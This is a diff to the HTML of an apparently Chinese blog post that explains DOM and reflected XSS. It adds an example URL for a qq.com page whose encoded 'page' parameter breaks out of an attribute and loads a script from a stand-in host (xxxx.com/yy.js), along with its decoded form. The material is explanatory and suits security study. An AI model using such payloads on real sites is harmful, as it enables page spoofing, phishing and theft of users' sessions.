@@ -173,12 +173,14 @@ $(document).bind('DOMNodeInserted', function(event) {
 
   <div class="entry-content"><p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>
 
+<p><a href="http://app.2008/qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E">http://app.2008/qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E</a></p>
+
 <p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>
 
 <p>page解码后为</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://xxxx.com/yy.js&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="s2">&quot;&gt;&lt;script src=&quot;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//xxxx.com/yy.js&quot;&gt;&lt;/script&gt;</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -199,7 +201,8 @@ $(document).bind('DOMNodeInserted', function(event) {
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>原始页面内容</p>
+<p>原始页面内容
+<a href="http://app.2008/qq.com/ppzj/view_dh.php?page=1">http://app.2008/qq.com/ppzj/view_dh.php?page=1</a></p>
 
 <p><img src="http://jason5.cn/images/xss-dom1.png" alt="" /></p>
 </div>
